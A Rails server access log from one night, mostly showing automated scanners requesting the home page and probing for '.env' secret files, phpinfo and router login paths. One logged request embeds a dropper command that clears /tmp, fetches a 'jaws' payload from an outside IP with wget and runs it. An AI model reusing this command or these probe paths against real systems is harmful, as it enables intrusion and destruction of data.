# Logfile created on 2023-01-22 00:03:02 +0900 by logger.rb/v1.5.0
I, [2023-01-22T00:03:02.125832 #1791623]  INFO -- : Started GET "/" for 167.248.133.118 at 2023-01-22 00:03:02 +0900
I, [2023-01-22T00:03:02.126672 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T00:03:02.127130 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:03:02.127813 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T00:03:02.129583 #1791623]  INFO -- : Completed 200 OK in 3ms (Views: 2.2ms | Allocations: 512)
I, [2023-01-22T00:03:02.400310 #1791621]  INFO -- : Started GET "/" for 167.248.133.118 at 2023-01-22 00:03:02 +0900
I, [2023-01-22T00:03:02.401066 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:03:02.401537 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:03:02.402195 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T00:03:02.402391 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-22T00:04:08.635382 #1791621]  INFO -- : Started GET "/" for 164.90.180.201 at 2023-01-22 00:04:08 +0900
I, [2023-01-22T00:04:08.636950 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:04:08.637422 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:04:08.639901 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.5ms | Allocations: 299)
I, [2023-01-22T00:04:08.640116 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.8ms | Allocations: 521)
I, [2023-01-22T00:33:04.919758 #1791621]  INFO -- : Started GET "/.env" for 185.81.157.204 at 2023-01-22 00:33:04 +0900
I, [2023-01-22T00:33:04.920454 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:33:04.920497 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T00:33:04.921081 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.2ms | Allocations: 4)
I, [2023-01-22T00:33:04.922632 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.8ms | Allocations: 299)
I, [2023-01-22T00:33:04.923388 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.6ms | Allocations: 521)
I, [2023-01-22T00:33:21.511832 #1791621]  INFO -- : Started GET "/.env.example" for 185.81.157.204 at 2023-01-22 00:33:21 +0900
I, [2023-01-22T00:33:21.512414 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:33:21.512453 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T00:33:21.513272 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:33:21.514238 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 298)
I, [2023-01-22T00:33:21.514402 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 507)
I, [2023-01-22T00:33:47.335035 #1791621]  INFO -- : Started GET "/api/.env" for 185.81.157.204 at 2023-01-22 00:33:47 +0900
I, [2023-01-22T00:33:47.335639 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:33:47.335678 #1791621]  INFO -- :   Parameters: {"all"=>"api/"}
I, [2023-01-22T00:33:47.336075 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:33:47.336664 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.6ms | Allocations: 298)
I, [2023-01-22T00:33:47.336971 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-01-22T00:34:10.446008 #1791621]  INFO -- : Started GET "/server/.env" for 185.81.157.204 at 2023-01-22 00:34:10 +0900
I, [2023-01-22T00:34:10.446586 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:34:10.446634 #1791621]  INFO -- :   Parameters: {"all"=>"server/"}
I, [2023-01-22T00:34:10.447039 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:34:10.447756 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-01-22T00:34:10.447910 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-01-22T00:34:26.908901 #1791623]  INFO -- : Started GET "/_profiler/phpinfo" for 185.81.157.204 at 2023-01-22 00:34:26 +0900
I, [2023-01-22T00:34:26.909509 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:34:26.909548 #1791623]  INFO -- :   Parameters: {"all"=>"_profiler/phpinfo"}
I, [2023-01-22T00:34:26.910232 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:34:26.914532 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 4.3ms | Allocations: 299)
I, [2023-01-22T00:34:26.916110 #1791623]  INFO -- : Completed 200 OK in 6ms (Views: 5.7ms | Allocations: 521)
I, [2023-01-22T00:34:43.508006 #1791623]  INFO -- : Started GET "/laravel/.env" for 185.81.157.204 at 2023-01-22 00:34:43 +0900
I, [2023-01-22T00:34:43.508733 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T00:34:43.508777 #1791623]  INFO -- :   Parameters: {"all"=>"laravel/"}
I, [2023-01-22T00:34:43.509414 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T00:34:43.512569 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.2ms | Allocations: 299)
I, [2023-01-22T00:34:43.513391 #1791623]  INFO -- : Completed 200 OK in 5ms (Views: 3.5ms | Allocations: 514)
I, [2023-01-22T01:03:16.614926 #1791623]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 01:03:16 +0900
I, [2023-01-22T01:03:16.617325 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T01:03:16.617386 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T01:03:16.617816 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:03:16.618442 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T01:03:16.618630 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-22T01:03:17.168806 #1791621]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 01:03:17 +0900
F, [2023-01-22T01:03:17.169227 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T01:28:04.843124 #1791621]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-22 01:28:04 +0900
I, [2023-01-22T01:28:04.844986 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T01:28:04.845053 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T01:28:04.846218 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:28:04.846884 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T01:28:04.850396 #1791621]  INFO -- : Completed 200 OK in 5ms (Views: 3.9ms | Allocations: 521)
I, [2023-01-22T01:28:05.413807 #1791623]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-22 01:28:05 +0900
F, [2023-01-22T01:28:05.414140 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T01:35:19.165208 #1791623]  INFO -- : Started GET "/" for 103.29.71.244 at 2023-01-22 01:35:19 +0900
I, [2023-01-22T01:35:19.166252 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T01:35:19.166872 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:35:19.168158 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.4ms | Allocations: 299)
I, [2023-01-22T01:35:19.168346 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 521)
I, [2023-01-22T01:56:35.286899 #1791623]  INFO -- : Started GET "/" for 47.252.13.90 at 2023-01-22 01:56:35 +0900
I, [2023-01-22T01:56:35.287498 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:35.287926 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:35.288629 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T01:56:35.289164 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 513)
I, [2023-01-22T01:56:42.528915 #1791623]  INFO -- : Started GET "/1674320202" for 47.252.13.90 at 2023-01-22 01:56:42 +0900
I, [2023-01-22T01:56:42.537401 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:42.537501 #1791623]  INFO -- :   Parameters: {"all"=>"1674320202"}
I, [2023-01-22T01:56:42.529759 #1791623]  INFO -- : Started POST "/sdk" for 47.252.13.90 at 2023-01-22 01:56:42 +0900
F, [2023-01-22T01:56:42.538364 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/sdk"):
  
I, [2023-01-22T01:56:42.538002 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:42.539424 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.5ms | Allocations: 520)
I, [2023-01-22T01:56:42.539649 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.8ms | Allocations: 727)
I, [2023-01-22T01:56:43.076834 #1791623]  INFO -- : Started GET "/text/try1674320202" for 47.252.13.90 at 2023-01-22 01:56:43 +0900
I, [2023-01-22T01:56:43.077804 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:43.077857 #1791623]  INFO -- :   Parameters: {"all"=>"text/try1674320202"}
I, [2023-01-22T01:56:43.078642 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:43.079574 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 298)
I, [2023-01-22T01:56:43.079744 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 511)
I, [2023-01-22T01:56:43.476764 #1791623]  INFO -- : Started GET "/" for 47.252.13.90 at 2023-01-22 01:56:43 +0900
I, [2023-01-22T01:56:43.477390 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:43.478033 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:43.478641 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 297)
I, [2023-01-22T01:56:43.479132 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 504)
I, [2023-01-22T01:56:43.525524 #1791623]  INFO -- : Started GET "/HNAP1" for 47.252.13.90 at 2023-01-22 01:56:43 +0900
I, [2023-01-22T01:56:43.526239 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:43.526284 #1791623]  INFO -- :   Parameters: {"all"=>"HNAP1"}
I, [2023-01-22T01:56:43.526737 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:43.527369 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 297)
I, [2023-01-22T01:56:43.527537 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 504)
I, [2023-01-22T01:56:43.576013 #1791623]  INFO -- : Started GET "/evox/about" for 47.252.13.90 at 2023-01-22 01:56:43 +0900
I, [2023-01-22T01:56:43.576715 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:43.576760 #1791623]  INFO -- :   Parameters: {"all"=>"evox/about"}
I, [2023-01-22T01:56:43.577218 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:43.577805 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.6ms | Allocations: 297)
I, [2023-01-22T01:56:43.577968 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 504)
I, [2023-01-22T01:56:53.690860 #1791621]  INFO -- : Started GET "/" for 47.252.13.90 at 2023-01-22 01:56:53 +0900
I, [2023-01-22T01:56:53.691836 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:53.692264 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:53.693061 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T01:56:53.693224 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 513)
I, [2023-01-22T01:56:54.082742 #1791621]  INFO -- : Started GET "/" for 47.252.13.90 at 2023-01-22 01:56:54 +0900
I, [2023-01-22T01:56:54.085619 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:54.086199 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T01:56:54.086868 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 297)
I, [2023-01-22T01:56:54.087036 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 504)
I, [2023-01-22T01:56:54.524191 #1791621]  INFO -- : Started GET "/" for 47.252.13.90 at 2023-01-22 01:56:54 +0900
I, [2023-01-22T01:56:54.524973 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T01:56:54.525587 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-01-22T01:56:54.526236 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-01-22T01:56:54.526414 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 509)
I, [2023-01-22T02:17:04.178006 #1791621]  INFO -- : Started GET "/" for 87.236.176.250 at 2023-01-22 02:17:04 +0900
I, [2023-01-22T02:17:04.179094 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T02:17:04.179948 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T02:17:04.181639 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.7ms | Allocations: 299)
I, [2023-01-22T02:17:04.182023 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.2ms | Allocations: 521)
I, [2023-01-22T02:25:35.316063 #1791623]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws" for 222.85.10.3 at 2023-01-22 02:25:35 +0900
I, [2023-01-22T02:25:35.316999 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T02:25:35.317054 #1791623]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 137.175.17.190/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-01-22T02:25:35.317466 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T02:25:35.319045 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 299)
I, [2023-01-22T02:25:35.319236 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 513)
I, [2023-01-22T02:33:42.517283 #1791621]  INFO -- : Started POST "/boaform/admin/formLogin" for 179.43.177.242 at 2023-01-22 02:33:42 +0900
F, [2023-01-22T02:33:42.517804 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/boaform/admin/formLogin"):
  
I, [2023-01-22T02:46:54.408498 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-22 02:46:54 +0900
I, [2023-01-22T02:46:54.409225 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T02:46:54.409283 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T02:46:54.409713 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T02:46:54.410855 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.2ms | Allocations: 299)
I, [2023-01-22T02:46:54.411184 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.6ms | Allocations: 521)
I, [2023-01-22T02:46:55.387885 #1791621]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-22 02:46:55 +0900
F, [2023-01-22T02:46:55.388221 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T03:23:12.461668 #1791621]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 03:23:12 +0900
I, [2023-01-22T03:23:12.462348 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T03:23:12.462395 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T03:23:12.462828 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T03:23:12.463439 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T03:23:12.463606 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 521)
I, [2023-01-22T03:23:12.998786 #1791621]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 03:23:12 +0900
F, [2023-01-22T03:23:12.999109 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T03:51:18.739612 #1791623]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 03:51:18 +0900
I, [2023-01-22T03:51:18.740204 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T03:51:18.740242 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T03:51:18.740666 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T03:51:18.742340 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.7ms | Allocations: 299)
I, [2023-01-22T03:51:18.742556 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 521)
I, [2023-01-22T03:51:19.283681 #1791621]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 03:51:19 +0900
F, [2023-01-22T03:51:19.284292 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T03:54:40.861407 #1791621]  INFO -- : Started GET "/" for 177.72.76.168 at 2023-01-22 03:54:40 +0900
I, [2023-01-22T03:54:40.861984 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T03:54:40.862413 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T03:54:40.863047 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T03:54:40.863978 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.0ms | Allocations: 513)
I, [2023-01-22T03:59:27.216966 #1791621]  INFO -- : Started GET "/" for 103.203.57.1 at 2023-01-22 03:59:27 +0900
I, [2023-01-22T03:59:27.217978 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T03:59:27.218443 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T03:59:27.219459 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 298)
I, [2023-01-22T03:59:27.219711 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 512)
I, [2023-01-22T04:14:17.773881 #1791621]  INFO -- : Started GET "/.env" for 151.80.238.18 at 2023-01-22 04:14:17 +0900
I, [2023-01-22T04:14:17.775196 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T04:14:17.775251 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T04:14:17.775692 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T04:14:17.777060 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.4ms | Allocations: 299)
I, [2023-01-22T04:14:17.777250 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 522)
I, [2023-01-22T04:14:19.067596 #1791621]  INFO -- : Started POST "/" for 151.80.238.18 at 2023-01-22 04:14:19 +0900
F, [2023-01-22T04:14:19.067936 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T04:15:00.466085 #1791623]  INFO -- : Started GET "/" for 167.94.146.59 at 2023-01-22 04:15:00 +0900
I, [2023-01-22T04:15:00.466694 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T04:15:00.467288 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T04:15:00.468268 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-22T04:15:00.468457 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 513)
I, [2023-01-22T04:15:00.997372 #1791621]  INFO -- : Started GET "/" for 167.94.146.59 at 2023-01-22 04:15:00 +0900
I, [2023-01-22T04:15:00.998004 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T04:15:00.998449 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T04:15:00.999225 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T04:15:00.999406 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T04:26:38.476418 #1791621]  INFO -- : Started GET "/" for 193.118.53.194 at 2023-01-22 04:26:38 +0900
I, [2023-01-22T04:26:38.477396 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T04:26:38.478091 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.2ms | Allocations: 4)
I, [2023-01-22T04:26:38.478731 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T04:26:38.478907 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T04:31:23.180664 #1791621]  INFO -- : Started GET "/.env" for 52.173.15.0 at 2023-01-22 04:31:23 +0900
I, [2023-01-22T04:31:23.181311 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T04:31:23.181354 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T04:31:23.181771 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T04:31:23.182572 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T04:31:23.182747 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T04:31:23.578436 #1791621]  INFO -- : Started POST "/" for 52.173.15.0 at 2023-01-22 04:31:23 +0900
F, [2023-01-22T04:31:23.578765 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T04:31:44.204990 #1791621]  INFO -- : Started GET "/.env" for 54.221.133.136 at 2023-01-22 04:31:44 +0900
I, [2023-01-22T04:31:44.205602 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T04:31:44.205641 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T04:31:44.206057 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T04:31:44.206698 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T04:31:44.207115 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T04:31:44.500622 #1791623]  INFO -- : Started POST "/" for 54.221.133.136 at 2023-01-22 04:31:44 +0900
F, [2023-01-22T04:31:44.500980 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T05:10:11.624225 #1791623]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.173.181 at 2023-01-22 05:10:11 +0900
I, [2023-01-22T05:10:11.625042 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T05:10:11.625189 #1791623]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-01-22T05:10:11.625658 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T05:10:11.626518 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T05:10:11.626680 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 506)
I, [2023-01-22T05:11:08.222242 #1791623]  INFO -- : Started GET "/" for 167.94.138.44 at 2023-01-22 05:11:08 +0900
I, [2023-01-22T05:11:08.222813 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T05:11:08.223288 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-01-22T05:11:08.223911 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-01-22T05:11:08.224071 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 512)
I, [2023-01-22T05:11:08.517808 #1791621]  INFO -- : Started GET "/" for 167.94.138.44 at 2023-01-22 05:11:08 +0900
I, [2023-01-22T05:11:08.518552 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T05:11:08.519090 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T05:11:08.520042 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-01-22T05:11:08.520223 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-01-22T05:11:58.199231 #1791621]  INFO -- : Started GET "/" for 144.126.228.112 at 2023-01-22 05:11:58 +0900
I, [2023-01-22T05:11:58.199805 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T05:11:58.200320 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T05:11:58.200991 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T05:11:58.201150 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 513)
I, [2023-01-22T06:12:10.925908 #1791621]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-01-22 06:12:10 +0900
I, [2023-01-22T06:12:10.926523 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T06:12:10.926565 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T06:12:10.927249 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T06:12:10.928542 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-01-22T06:12:10.928741 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 521)
I, [2023-01-22T06:12:11.476652 #1791621]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-01-22 06:12:11 +0900
F, [2023-01-22T06:12:11.477189 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
